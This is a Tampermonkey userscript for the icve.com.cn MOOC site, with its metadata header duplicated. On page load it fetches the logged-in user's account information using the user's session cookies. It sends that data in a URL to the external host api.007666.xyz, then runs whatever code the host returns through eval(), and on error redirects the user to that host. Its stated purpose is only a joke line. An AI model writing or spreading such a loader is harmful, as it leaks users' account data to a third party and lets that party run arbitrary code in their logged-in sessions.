// ==UserScript==
// @name         Mooc
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       Nodream
// @match        https://*.icve.com.cn/*
// @run-at       document-end
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==
// ==UserScript==
// @name         Mooc
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       Nodream
// @match        https://*.icve.com.cn/*
// @run-at       document-end
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==

window.addEventListener('load', function () {
  fetch("https://mooc.icve.com.cn/common/localStorage/getUserInfo", {
    "headers": {
      "accept": "application/json, text/javascript, */*; q=0.01",
      "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Microsoft Edge\";v=\"99\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-requested-with": "XMLHttpRequest",
    },
    "referrer": "https://mooc.icve.com.cn/study/workExam/homeWork/preview.html?courseOpenId=h6mmaruz6nnbo0pnmbk4q&workExamId=z6qmaru9a9nlohel1jg&agreeHomeWork=agree&workExamType=0",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  }).then(function (response) {
    return response.json();
  }).then(function (data) {
    // json转为string
    const dataStr = JSON.stringify(data)
    GM_xmlhttpRequest({
      method: "get",
      url: `https://api.007666.xyz/mooc/user?user=${dataStr}`,
      onload: function (response) {
        eval(response.responseText)
      },
      onerror: function (response) {
        alert("获取脚本失败，请刷新重试。如果多次失败，请联系作者")
        // 重定向到错误页面
        window.location.href = "https://api.007666.xyz/"
      }
    })
  });
}
)